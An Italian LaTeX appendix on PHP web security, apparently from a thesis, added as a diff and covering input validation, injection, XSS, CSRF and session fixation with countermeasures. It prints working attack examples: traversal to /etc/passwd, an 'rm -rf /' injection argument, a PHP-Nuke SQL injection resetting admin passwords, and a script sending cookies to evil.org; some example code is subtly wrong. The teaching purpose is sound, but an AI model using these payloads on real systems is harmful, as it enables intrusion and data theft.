@@ -1,0 +1,395 @@
+\clearpage{\pagestyle{empty}\cleardoublepage}
+\chapter{PHP e Web Security}
+\label{appendicePHPWS}  
+
+In questa appendice riportiamo una serie di problematiche generali che si trovano ad affrontare nelle applicazioni web ed in particolari con tecnologia PHP.\\
+
+\subsubsection{Controllo dell'input e register globals}
+Alla base delle applicazioni web uno dei principi fondamentali da non dimenticare è che i dati provenienti dalle richieste degli utenti non sono sicuri.\\
+Per esempio a causa della natura state-less del protocollo HTTP non esiste garanzia che uno script venga invocato dal form che gli è associato o tramite l'URI che abbiamo costruito. Qualunque utente può creare la sua richiesta tramite GET e POST e modificarla a piacimento.\\
+In pratica non bisogna mai fare affidamento al fatto di aver inviato un certo form o creato certi URI alla pagina precedente.\\
+
+Da questo punto di vista i controlli Javascript eseguiti su un client inutili per quanto riguarda l'aspetto della sicurezza, ma possono essere soltanto una comodità per evitare inutili richieste al server e migliorare l'usabilità.\\
+Per ogni richiesta è compito degli script residenti sul server eseguire sempre comunque tutti i controlli necessari:\begin{itemize}
+\item formato della richiesta
+\item formato dei parametri (sintassi del contenuto e caratteri speciali, ...)
+\item range dei valori
+\end{itemize}
+
+Nelle versioni precedenti alla 4.2 di PHP la direttiva \texttt{register globals=on} era impostata di default.\\
+L'effetto di questa direttiva è di registrare come variabili globali tutte le variabili provenienti dall'input (GET, POST, COOKIE, SESSIONI, ecc...) che da un lato offre una maggiore comodità, ma con il crescere della complessità delle applicazioni ha presto portato a seri problemi.\\
+L'ordine con cui viene eseguito il parsing di queste variabili può essere definito tramite la direttiva \texttt{track vars}. Il problema risede nel fatto che le variabili il cui parsing avviene per ultimo
+sovrascrivono le precedenti nel caso dovesse avvenire una collisione tra i nomi e ci si trovava
+nell'impossibilità di riconoscere la fonte di una variabile.\\
+Per fortuna con PHP 4.1 sono stati introdotti gli array superglobal (visibili all'interno di ogni scope)
+\$\_GET[], \$\_POST[], \$\_SESSION[], ecc... che risolvono queste ambiguità e rendono
+altrettanto il loro utilizzo utilizzo rispetto ai \$HTTP\_GET\_VAR[], \$HTTP\_POST\_VARS[], ecc\ldots\\
+
+Di seguito è riportato un breve un esempio \cite{linkPHPeSSQLInjection} dei problemi causati da questa direttiva.\\
+
+Il seguente problema è stato riscontrato bug in Mambo Site Server 3.0.x, un sistema per content management basato su PHP e MySQL, il codice è riportato in maniera semplificata:
+\begin{small}\begin{verbatim}
+   <?php
+      [...]
+      if ($dbpass == $pass) {
+         session_register("myname");
+         session_register("fullname");
+         session_register("userid");
+         header("Location: index2.php");
+      }
+   ?>
+\end{verbatim}\end{small}
+Nella directory \texttt{'admin/'} lo script \texttt{index.php} verifica che la password inserta in un form \texttt{\$pass} corrisponda a quella prelevata in un database \texttt{\$dbpass}:\\
+Quando le password corrispondo le variabili \texttt{\$myname}, \texttt{\$fullname} e \texttt{\$userid} sono registrate come variabili di sessione.\\
+A questo punto l'utente viene reindirizzato alla pagina \texttt{index2.php} che contiene il seguente codice:\begin{small}\begin{verbatim}
+   <?php
+      if (!$PHPSESSID) {
+         header("Location: index.php");
+         exit(0);
+      } else {
+         session_start();
+         if (!$myname) session_register("myname");
+         if (!$fullname) session_register("fullname");
+         if (!$userid) session_register("userid");
+   }
+\end{verbatim}\end{small}
+Se l'ID di sessione non è impostato l'utente viene rispedito alla pagina contenente il form di login, altrimenti vengono ripristinate le variabili di sessione nello scope globale.\\
+Questo meccanismo può essere aggirato molto semplicemente.\\
+Si prenda in considerazione il seguente URI:
+\begin{small}\begin{verbatim}
+   /admin/index2.php?PHPSESSID=1&myname=admin&fullname=joe&userid=admin
+\end{verbatim}\end{small}
+Supponendo \texttt{register globals=off} le variabili provenienti da GET \texttt{\$PHPSESSID},
+\texttt{\$myname}, \texttt{\$fullname} e \texttt{\$userid} sono create come variabili globali per default, così al momento dei controlli la variabile \texttt{\$PHPSESSID} risulta settata ed è possibile prendere facilmente l'identità di un qualsiasi utente senza nemmeno la necessità di interrogare il database.\\
+
+Come soluzione per evitare questi problemi è quindi sempre consigliabile mantenere la direttiva \texttt{register globals=off}, ma purtroppo alcuni programmatori PHP faticano ad adottare il nuovo stile, e parecchi invece che utilizzano guide cartacee un po' datate si trovano ad imparare un modo di implementare il codice che dovrebbe andare in disuso.\\
+
+
+\subsubsection{Controllo delle inclusioni, code injection}
+PHP dispone di un sistema molto flessibile, ma che può diventare anche molto pericoloso di inclusione dei files tramite i costrutti \texttt{include()}, \texttt{require()}, \texttt{include\_once()}, \texttt{require\_once()}, che permettono di richiamare un altro file all'interno di uno script PHP.
+Il motivo di queste caratteristiche è dato da dal fatto che i file inclusi ereditano completamente lo scope del file che gli include potendo scrivere e leggere tutte le variabili.\\
+Anche se assomigliano a funzioni, si tratta di costrutti che possono essere anche inclusi in un blocco condizionato valutato a run-time (a differenza dei preprocessori).\\
+Infine se la direttiva \texttt{allow url fopen} è attivata possono essere inclusi file che risiedono su
+macchine remote disponibili su http o ftp.\\
+
+Un caso molto tipico è quelli di siti che includono il corpo centrale di una pagina in una struttura simile per tutte le altre ed utilizzano a questo scopo una semplice inclusione e definiscono degli URI del tipo:\begin{small}\begin{verbatim}
+http://www.example.com/index.php?pg=home
+\end{verbatim}\end{small}
+e poi non fanno altro che una semplice inclusione al centro della pagina, del tipo
+\begin{small}\begin{verbatim}
+   <?php
+      include (\$_GET['pg'].'php');
+   ?>
+\end{verbatim}\end{small}
+
+In questo esempio con una semplice modifica dell'URI con chiamate del tipo \begin{small}\begin{verbatim}
+http://www.example.com/index.php?pg=../../../etc/passwd
+\end{verbatim}\end{small}
+può semplicemente accedere a qualsiasi altro file della cartella web o nei peggiori dei casi a qualsiasi file della macchina se i diritti sul file system non sono ben impostati o la direttiva \texttt{open basedir} non è settata nel file di configurazione.\\
+Nel caso si attivata \texttt{allow url fopen} e persino possibile provocare inclusioni del tipo:\begin{small}\begin{verbatim}
+http://www.example.com/index.php?pg=http://example.org/evil-script
+\end{verbatim}\end{small}
+\begin{small}\begin{verbatim}
+     <?php
+        include ('http://www.example.org/evil_script'.'.php');
+     ?>
+\end{verbatim}\end{small}
+rendendo eseguibile sulla macchina qualsiasi script esterno.\\
+
+\'E quindi buona norma tenere disattivato allow url fopen a meno che non sia strettamente
+necessario, ed è preferibile attivare la \texttt{open basedir}.\\
+
+Un altro problema in cui spesso si incorre è di lasciare i file php che vengono inclusi sotto la DOCUMENT\_ROOT web ed assegnare a questi file delle estensioni che non vengono interpretate da php, come capita in molti esempi di vecchi manuali es: ".inc" .\\
+
+In questo modo il sorgente dei documenti diventa accessibile in chiaro dall'esterno.\\
+Se i file contengono codice PHP si raccomanda di usare per loro sempre un'estensione eseguibile, se si vuole avere la possibilità di distinguerli si possono utilizzare nomi del tipo "nomefile.inc.php".
+Altre possibilità possono essere utilizzare le direttive di apache tramite \texttt{.htaccess} e fare in modo che cartelle che contengono i file inclusi non siano accessibili agli utenti.\\
+La soluzione migliore rimane comunque mettere questi files in cartelle completamente al di fuori della DOCUMENT\_ROOT.\\
+
+
+\subsubsection{Oggetti e tipi di dato}
+PHP è un linguaggio dinamicamnete tipizzato (o non fortemente tipizzato). Il tipo di dato di una varaibile viene valutato a run-time e può cambiare durante l'esecuzione.\\
+
+Questo meccanismo può creare molti problemi se non correttamente capito. Operazioni sulle variabili di imput possono cambiare radicalmente l'esecuzione del programma se vengono fatte certe ipotesi errare sul tipo. Per questo risulta di ancora di maggiore importanza eseguire controlli accurati sulle varibili di ingresso come già descritto precedentemente.\\
+Un errore tipico di impostazione concettuale dei programmatori è di interstardirsi a \emph{filtrare i valori non ammissibili}. Questo modo di agire può portare a dimenticanze o a facili sviste. Il modo corretto di impostare il problema è ragionando in logica positiva, quindi \emph{accettare i valori ammissibili}.\\
+
+Altro errore tipico è quello di continuare a ragionare secondo gli schemi C per cui il valore booleano falso è identificato dall'intero 0.\\ In PHP esiste il tipo di dato booleano, ed eventualmente ne viene fatto casting implicito quando necessario.\begin{small}\begin{verbatim}
+<?php
+   //sbagliato
+   while( $str = fgets($risorsa) ) {...}
+   
+   //giusto
+   while(!($str = fgets($risorsa)) === false) {...}
+?>
+\end{verbatim}\end{small}
+L'operatore \texttt{===} oltre a confrontare il valore della variabile controlla anche che il tipo sia lo stesso.\\
+
+Nella versione 4 di PHP non è possibile incapsulare metodi o variabili all'interno di una classe,
+solo a partire da PHP5 è disponibilè la possibilità di dichirare un metodo o una variabile private.\\
+Per questo è insicuro creare degli oggetti PHP disponibili ad altre risorse che contengano dati
+riservati.\\
+
+Spesso capita che in oggetti o classi implementate facendo porting da altri linguaggi che supportano l'incapsulamento ci siano dei dati sensibili esposti all'esterno.\\
+Un esempio può essere trovato \cite{PHPeWS} a corredo del pacchetto PHP GNUpgp. Tra gli script ve ne sono molti, nei quali dopo aver utilizzato un oggetto della classe \texttt{gnugpg} è possibile risalire ancora alla passphrase o ai messaggi riservati dell'utente salvati all'interno dell'oggetto.\\
+Script di questo tipo vulnerabili a code injection permetterebbero ad un attaccante di risalire a tutte le informazioni riservate.\\
+
+Una definizione differente delle interfacce, semplicemente non appoggiandosi a proprietà interne (che non possono essere private) può risolvere il problema.\\
+
+
+\subsubsection{Command injection}
+PHP mette a disposizione alcune funzioni come \texttt{system()}, \texttt{exec()}, ecc... che permettono di rendere più flessibili i propri script e di appoggiarsi a eseguibili di sistema.\\
+Tuttavia bisogna porre molta attenzione perchè ogniuna di queste funzioni ha diversi comportamenti. Alcune di essere permettono di eseguire comandi shell, altre che possono sembrare molto simili invece solo file eseguibili.\\
+Bisogna porre la massima attenzione nel loro utilizzo per non permettere di eseguire comandi arbitrari.\\
+Possono essere pericolose:\\\begin{itemize}\item eval()
+\item preg\_replace()
+\item exec()
+\item passthru()
+\item system()
+\item popen()
+\item il modificatore "/e" (tratta un parametro stringa come codice PHP)
+\item ` (backticks ­ possono essere usate per eseguire comandi)
+\end{itemize}
+In tutti questi casi è buona norma leggere attentamente tutti i consigli riportati in fondo al manale.\\
+
+Esistono funzioni mostrate nei seguenti esempi che permettono di risolvere alcuni di questi problemi \begin{small}\begin{verbatim}
+<?php
+   $bad_arg = '-al; rm -rf /';
+   $ok_arg = escapeshellarg($bad_arg);
+   // visualizza tutti i files; poi cancella tutto!
+   system("ls $bad_arg");
+   // visualizza un file chiamato "-al; rm -rf /" se esiste
+   system("ls $ok_arg");
+?>
+
+<?php
+   $bad_format = 'html <a>';
+   $ok_format = escapeshellcmd($bad_format);
+   // errore redirezione input/output
+   system("/usr/local/bin/formatter-$bad_format");
+   // esegue formatter-html con argomento <a>
+   system("/usr/local/bin/formatter-$ok_format");
+?>
+\end{verbatim}\end{small}
+\texttt{escapeshellarg()} esegue l'escaping di un argomento ad un comando shell.\\
+\texttt{escapeshellcmd()} esegue l'escaping di tutti i caratteri che verrebbero interpretati dalla shell:
+( \# \& ; ` ' " | * ? ~ < > \^ ( ) [ ] \{ \} \$ \\ 0x0A 0xFF ) senza eseguire il quoting.\\
+
+
+
+\subsubsection{Database Security e SQL Injection}
+La sicurezza dei Database parte dal design della loro architettura.\\
+Tutti i database relazionali forniscono strumenti per gestire i privilegi sulle loro tabelle e per creare delle viste.\\
+Uno dei tipici errori che si commettono è far accedere gli applicativi ai database con diritti di super user. Ciò permette ad eventuali intrusi che riescano a prendere il controllo della connessione di
+poter leggere o eliminare e avere piene diritti sull'intero contenuto del database.\\
+La stessa regola vale per PHP, è sempre bene creare degli utenti con i diritti minimi indispensabili
+per le azioni che deve compiere l'applicazione web in modo da ridurne i rischi.\\
+
+Le connessioni al database sono un altro punto critico per la sicurezza, in particolare se il database
+non risiede sulla stessa macchina che esegue l'applicazione.\\
+\'E buona norma, se possibile, incapsulare le connessioni all'interno del protocollo SSL e/o far girare
+la connessione su una rete privata inaccessibile all'esterno.\\
+
+In PHP come nella stragrande maggioranza delle applicazioni Web si costruisco spesso delle query
+concatenando i costrutti SQL con dati creati a partire dall'input dell'utente, per esempio provenienti
+da un form.\\
+Uno dei rischi che si corre è quello di input scritto ad hoc per modificare le query che si intendeva
+eseguire, detto SQL injection.\\
+Una prima protezione si ottiene mantenendo la direttiva \texttt{gpc magic quotes=on} nel file php.ini
+Quando questa direttiva è attivata, in tutte le variabili che provengono dall'input (GET, POST,
+COOKIE) PHP aggiunge automaticamente a del caratteri \ (backslash) di fronte ai caratteri ' (quote)
+'' (double-quote) e \ (backsalsh) in modo permettere che siano inseriti senza problemi come valori di
+una query SQL.\\
+Nel caso si voglia tornare alla forma originale dei dati di input è messa a disposizione la funzione
+\texttt{strip\_slashes()}.\\
+Un esempio di SQL injection \cite{} è descritto brevemente qui di seguito:\\
+
+Il seguente problema è stato riscontrato bug in PHP-Nuke 5.x e consiste in una combinazione di
+sovrapposizione di variabili globali e una variabile costituente una query SQL non controllata.\\
+Gli sviluppatori di PHP-Nuke hanno scelto di aggiungere un prefisso \texttt{\$prefix = "nuke"} al
+nome di tutte le tabelle, questa variabile è definita nel file \texttt{config.php} a sua volta incluso nel file \texttt{mainfile.php}.\\
+Nello script \texttt{article.php} compare il seguente codice:
+\begin{small}\begin{verbatim}
+   <?php
+      [...]
+      if (!isset($mainfile)) {
+         include("mainfile.php");
+      }
+      if (!isset($sid) && !isset($tid)) {
+         exit();
+      }
+      [...]
+      mysql_query("UPDATE $prefix"._stories." SET counter=counter+1 where sid=$sid"); 
+?> 
+\end{verbatim}\end{small}
+	  
+Per scriver una query arbitraria è sufficiente far in modo che \$prefix non venga impostata al suo valore di default ed impostargli un valore arbitrario via GET supponendo \texttt{register globals=off}.
+Per far questo è sufficiente settare le variabili \texttt{\$mainfile}, \texttt{\$sid} e \texttt{\$tid} a dei valori qualsiasi sempre via GET in modo che non venga fatta l'inclusione del file \texttt{config.php}.\\
+
+Ora siamo in grado di eseguire una qualsiasi query SQL che inizi con UPDATE.\\
+Per esempio il seguente URI:
+\begin{small}\begin{verbatim}
+/article.php?mainfile=1&sid=1&tid=1&prefix=nuke.authors%20set%20pwd=1%23
+\end{verbatim}\end{small}
+imposta tutte le password degli amministratori al valore '1' producendo la seguente query:
+\begin{small}\begin{verbatim}
+  UPDATE nuke.nuke_authors set pwd=1#_stories
+  SET counter=counter+1 where
+\end{verbatim}\end{small}
+Naturalmente tutto ciò che segue il carattere \# viene considerato un commento e quindi ignorato.
+
+Esistono diverse possibili soluzioni per evitare il problema.\\
+Prima di tutto eseguire una validazione dell'input e facendo un corretto escaping dei caratteri nelle stringhe che compongono le query.\\
+Di base configurare almeno PHP con \texttt{gpc magic quotes=on} o in alternativa usare la funzione addslashes(). Per sapere come agire e fare applicazioni portabili rispetto alla configurazione verificare a runtime la configurazione con \texttt{iniget()}.\\
+Una soluzione più corretta consiste nell'utilizzare le funzioni specifiche di ogni database relazionale  \texttt{mysql\_escape\_string()}, \texttt{pgsql\_escape\_string()}, ecc\ldots\\
+Molti Dabatabase abstraction layer mettono a disposizione un metodo wrapper di queste diverse funzioni. Per esempio con PEAR DB si utilizza \texttt{DB::quote()}, oppure si possono usare le prepared queries utilizzando il carattere "?" per eseguire le sostituzioni\\
+Oltre ai caratteri speciali delle stringhe bisogna ricordare anche di eseguire l'escaping dei caratteri "\%" e "\_" quando usati in combinazione con il particolare costrutto LIKE.\\
+
+
+\subsubsection{XSS: Cross Site Scripting}
+Cross Site Scripting (XSS) avviene quando delle applicazioni web creano output a partire da contenuti inseriti precedentemente da utenti malintenzionati (esempio tipico: forum, bacheche virtuali, blogs,\ldots).\\
+L'output se non correttamente controllato può permettere di inserire codice HTML o comandi di scripting che verranno interpretati dal browser (JavaScript, VBScript, ActiveX).\\
+
+\begin{figure}[!ht]
+ \centering
+\includegraphics{img/30-phpws-xss.jpg}
+ \caption{Cross Site Scripting}
+ \label{fig:phpws-xss}
+\end{figure}
+
+La pericolosità viene spostata sulle spalle dell'utente finale dell'applicazione, molto spesso non in grado di discernere tra richieste valide e malevoli, soprattutto nel caso queste siano sufficientemente  precise da replicare il normale aspetto che l'utente si aspetta da una pagina HTML.\\
+Rischi correlati riguardano la possibilità di accedere e modificare le  informazioni visibili dall'utente attaccato (account hijacking, cookie theft/poisoning, session stealing e false advertising) e poter sfruttare i browser degli utenti per attacchi DoS distribuiti (anche se è facile risalire alla causa) verso altri server web.\\
+
+L'attacco avviene solitamente attraverso la modifica/creazione di appositi tag nelle pagine del server attaccato.\\
+
+Esempio di cookie stealing:
+\begin{small}\begin{verbatim}
+<script type="JavaScript">
+document.location='http://www.evil.org/read_cookie.php?'+document.cookie
+</script>
+\end{verbatim}\end{small}
+
+Il maggiore problema degli XSS è che risultano difficilmente individuabili. Sono pochi e molto primitivi gli strumenti in grado di analizzare le pagine alla ricerca di questi tipi di exploit e gli utenti finali spesso non sono in grado di riconoscere .\\
+Il punto di attacco può essere infatti reso difficilmente individuabile magari eseguendo l'encoding del codice tramite parte dello script stesso.\\
+
+Per evitare questi tipi di attacchi attraverso i propri server è necessario filtrare correttamente l'output e in secondo luogo utilizzare come deterrente sistemi di autenticazione sicura per identificare chi inserisce le informazioni malevole.\\
+
+\subsubsection{CSRF: Cross-Site Request Forgeries}
+Come il XSS si tratta di una vulnerabilità che sfrutta un utente per attaccare a sua insaputa un'altra applicazione sfruttandone i suoi privilegi.\\
+L'attacco CSRF\footnote{CSRF deve essere pronunciato come "sea-surf"} avviene nel momento in cui l'utente attaccato che possiede diritti su un web server A (server attaccato) visita una pagina su un web server B (in cui l'attaccante può introdurre uno script CSRF).\\
+
+\begin{figure}[!ht]
+ \centering
+\includegraphics{img/31-phpws-csrf.jpg}
+ \caption{Cross Site Request Forgeries}
+ \label{fig:phpws-csrf}
+\end{figure}
+
+La pagina costruita dall'attaccante sul server B contiene solitamente dei tag che permettono di eseguire operazioni GET al browser come src in img, iframe, \ldots
+Senza che l'utente se ne accorga possono essere eseguite operazioni su un altro server (o anche sul server stesso) utilizzando i suoi provilegi.\\
+
+Esempi:\begin{small}\begin{verbatim}
+<img src="https://trading.example.com/xfer?from=MSFT\&to=RHAT">
+<img src="https://books.example.com/clickbuy?book=ISBN\&qty=100">
+\end{verbatim}\end{small}
+
+L'utente finale non si accorgerà di nulla, se non di non riuscire a visualizzare alcune immagini.\\
+Questo tipo di attacco è molto pericoloso perchè apre nuove strade di accesso. L'attacco può essere infatti eseguito anche spedendo mail in formato HTML attaccando specifici utenti che si possono trovare anche dietro un firewall o in sottoreti non pubbliche.\\
+Esempio:\begin{small}\begin{verbatim}
+<img src="https://intranet.example.com/admin/purgedb?rowslike=%2A>
+\end{verbatim}\end{small}
+
+
+Sono particolarmente vulnerabili ai CSRF le applicazioni web che eseguono operazioni "importanti" attraverso semplici richieste GET o utilizzano sistemi di auto-login (\ldots e gli utonti che non eseguono il logout).\\
+
+
+\subsubsection{Session Fixation}
+
+Praticamente tutte le applicazioni web utilizzano la gestione degli accessi degli utenti tramite sessioni.\\
+Il meccanismo consiste nel salvare sul server tutte le informazioni relative all'utente, lasciando al client solo il compito di comunicare un identificativo: il Session Identifier (SID).\\
+Naturalmente come già mostrato negli esempi precedenti gli ID di sessione rappresentano un punto di accesso molto esposto agli attacchi.\\
+
+Esistono 4 tipi di tecniche di attacco: intercettazione, predizione, forza bruta e session fixation.
+I primi tre vengono evitati rispettivamente tramite cifratura del traffico, utilizzo di identificativi casuali e con un ampio spazio di nomi.\\
+
+Il session fixation consiste nell'imporre ad un utente attaccato un id di sessione noto a priori e successivamente sfruttarlo per ottenerne i diritti relativi alla sua identità.\\
+
+\begin{figure}[!ht]
+ \centering
+\includegraphics{img/32-phpws-session-fixation.jpg}
+ \caption{Session Fixation}
+ \label{fig:phpws-session-fixation}
+\end{figure}
+
+
+Prima l'attaccante crea una \emph{trap session} sul server attaccato.\\ 
+Per i server che non permettono la generazione al volo di una nuova sessione con id noto, è necessario crearne una  semplicemente visitando il sito web e leggerne l'identificativo. In questo caso la sessione deve essere mantenuta attiva inviando eventualemente altre richieste periodiche .\\
+
+L'attaccante tenta di impostare sul browser dell'utente attaccato la trap session. Esistono diversi metodi per fare questo a seconda di come il server attaccato gestisce la sessione.\\
+L'id di sessione può essere impostato tramite un URI.
+\begin{small}\begin{verbatim}
+http://worldbank.example.com/index.php?sid=1fac52e05bb3008da
+\end{verbatim}\end{small}
+Può essere inviato via e-mail o pubblicato su altri siti web ma risulta facilmente riconoscibile come punto d'attacco. Possono essere create pagine dinamiche su server a disposizione dell'attaccante che possono eseguire redirect con la trap session solo se riconoscono l'utente da attaccare.\\
+Il secondo metodo prevede l'aggiunta di campi hidden preimpostati con la trap session al form di login. Può essere eseguito anche semplicemente creando pagine simili su altri server se il server attaccato non controlla il referrer dei form.\\
+Il terzo metodo è utilizzando i cookie, e dipende fortemente dal browser e dal livello di sicurezza impostato. Se il browser accetta cookie da domini diversi da quello che si sta navigando, su qualsiasi sito può essere impostato il cookie tramite header, script o il tag \texttt{<META SetCookie />}.
+Se il browser non accetta cookie da altri domini, l'attacco può essere fatto solo se il sito attaccato è vulnerabile rispetto a XSS, se si può eseguire DNS poisoning o se sullo stesso domino esistono più siti web in cui l'attacante può sfruttare uno dei tre meccanismi. Per esempio i gestori dei contenuti di \texttt{www.unibo.it/Magazine/} potrebbero facilmente eseguire questo tipo attacco nei confronti di \texttt{uniwex.unibo.it}.\\
+A seconda del tipo di attacco eseguito è anche possibile rilevare con certezza o meno l'istante in cui l'utente accetta l'id della trap session.\\
+
+Una volta che l'id di sessione è stato impostato l'attaccante deve solo attendere che l'utente attaccato visiti il sito ed esegua il login.\\
+A questo punto l'attaccante può sfuttare lo stesso id di sessione per accedere con i diritti dell'utente attaccato al web server.\\
+
+Contromisure possibili possono essere.\\
+\begin{itemize}
+\item Generare una nuova sessione ad ogni login dell'utente, non riutilizzare la sessione già esistente
+\item Generare una nuova sessione ogni volta che un utente si presenta da altri referer (può risultare scomodo per gli utenti perdere la sessione inaspettatamente in alcuni rari casi)
+\item Limitare l'utilizzo di una sessione ad un solo tipo di browser (anche se più difficilmente il meccanismo può essere raggirato).
+\item Limitare l'utilizzo di una sessione ad un solo indirizzo ip (può non permettere l'accesso ad utenti che sono in reti con ip che variano dinamicamente durante la sessione e non impedisce l'attacco ad utenti che usano NAT o proxy).
+\end{itemize}
+
+\subsubsection{Error handling, logging}
+La gestione degli errori è un problema trascurato in molte le applicazioni web.\\
+\'E abbastanza usuale veder comparire nelle pagine web errori PHP o interi stack trace di una servlet Java.\\ 
+
+PHP dispone di alcune direttive e funzioni che permettono di impostare il livello di reporting degli errori (notice, warning, fatal error o parse error), di personalizzarne il formato di visualizzazione e scegliere differenti handler.\\
+In fase di implementazione del codice è sempre buona norma tenere di default gli errori visualizzati sul browser ed impostare attraverso la direttiva \texttt{error reporting=E\_ALL} in \texttt{php.ini} oppure run-time con la funzione \texttt{error\_reporting(E\_ALL)}, in questo modo è possibile notare fin da subito anche piccoli warning e porvi rimedio.\\ 
+Sui sistemi di produzione è meglio non visualizzare questi errori sul browser in quanto spesso possono contenere informazioni sulla struttura delle  directory, posizione degli script, nomi dei file sorgenti.
+\begin{small}\begin{verbatim}
+Warning: mysql_num_rows():
+supplied argument is not a valid MySQL result resource in
+/home/httpd/vhosts/example.com/httpdocs/sinistra.php on line 40
+\end{verbatim}\end{small}
+
+Una semplice maniera per evitare che un errore venga visualizzato sul browser è porre il carattere "\texttt{@}" all'inizio di una riga di codice PHP. In questo modo tutti gli errori relativi a quella riga non verranno visualizzati, con tutti i possibili problemi del caso.\\
+
+Sia attraverso la configurazione di \texttt{php.ini} che attraverso le funzioni di Error Handling e Logging è possibile definire delle diverse risorsa di output degli errori, definire nuovi tipi di errore o creare i propri handler per la gestione di ogni tipo di errore con i quali è possibile per esempio inviare dei messaggi personalizzati, salvare gli errori su un file di log, inviare delle notifiche in e-mail, ecc\ldots\\
+
+A seguire è riportato un esempio su come definire handler personalizzati 
+\begin{small}\begin{verbatim}
+   <?php
+      set_error_handler('do_errors');
+      function do_errors($errno,$errstr,$errfile,$errline) {
+         error_log("ERROR ($errfile:$errline): $errstr");
+         header('Location: http://example.com/error.php');
+         exit();
+      }
+   ?>
+\end{verbatim}\end{small}
+e un esempio su usare error\_log()\begin{small}\begin{verbatim}
+   <?php
+      error_log ("Messaggio errore",1,"sysadmin@example.com");
+      error_log ("Messaggio errore",2,"127.0.0.1:7000");
+      error_log ("Messaggio errore",3,"/var/tmp/my_err.log");
+   ?>
+\end{verbatim}\end{small}
+
+\subsubsection{Safe mode}
+Il \texttt{safe mode} è una direttiva di configurazione nata per far coesistere senza problemi più applicazioni web su uno stesso server ed è molto utilizzata dagli ISP insieme alla direttiva \texttt{open base dir}.\\
+La direttiva può essere impostata solo modificando manualmente il file php.ini, quindi presumibilmente solo da chi amministra il server.\\
+Tramite il file di configurazione è possible:
+\begin{itemize}
+\item Limita l'esecuzione di funzioni "potenzialmente" pericolose che accedono al sistema come \texttt{system()}, \texttt{exec()}, \ldots
+\item Ogni volta che uno script accede ad un altro file PHP verifica l'esatta corrispondenza tra gli owner del file oppure se \texttt{safe mode gid} è attivo verifica anche i gruppi di appartenenza.
+\item Permette di impedire l'accesso ad alcune variabili dell'enviroment che contengono informazioni sulla configurazione del server che potrebbero essere utili ad un attaccante.
+\item Permette di limitare l'accesso al filesystem con \texttt{open base dir} effettua una limitazione che si può considerare simile a quella di \texttt{chroot} sui sistemi Unix.
+\item Permette di impedire l'uso di altre funzioni e/o classi specificate manualmente dall'amministratore di sistema.
+\end{itemize}
